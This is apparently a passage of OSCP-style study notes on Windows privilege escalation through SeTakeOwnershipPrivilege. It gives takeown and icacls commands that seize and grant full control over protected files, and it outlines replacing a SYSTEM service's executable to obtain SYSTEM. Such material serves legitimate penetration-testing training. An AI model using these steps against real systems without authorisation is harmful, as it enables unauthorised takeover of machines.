`SeTakeOwnershipPrivilege` → **take ownership → grant yourself permissions → modify/replace the target → trigger it.**
### **How to test a specific target**

```
takeown /f "C:\Path\to\target.exe"
```

If successful, grant yourself permissions:

```
icacls "C:\Path\to\target.exe" /grant "$env:USERNAME":F
```

Check the resulting ACL:

```
icacls "C:\Path\to\target.exe"
```

---

## **Exploitation workflow**
### **1. Take ownership**

For a protected file:
```
takeown /f "C:\Path\to\file.exe"
```

For a directory and its contents:
```
takeown /f "C:\Path\to\folder" /r /d y
```

### **2. Grant yourself Full Control**
```
icacls "C:\Path\to\file.exe" /grant "$env:USERNAME":F
```

### **3. Modify the target**

You can now potentially:

- Modify a protected file.
- Replace a service executable.
- Modify a protected configuration file.
- Change permissions on a protected resource.
### **4. Get SYSTEM**

The useful OSCP scenario is:

- A service runs as `NT AUTHORITY\SYSTEM`.
- You can take ownership of its executable.
- You grant yourself write access.
- You replace the executable with a compatible executable you control.
- You can restart or otherwise trigger the service.

You then obtain SYSTEM when that service executes your replacement.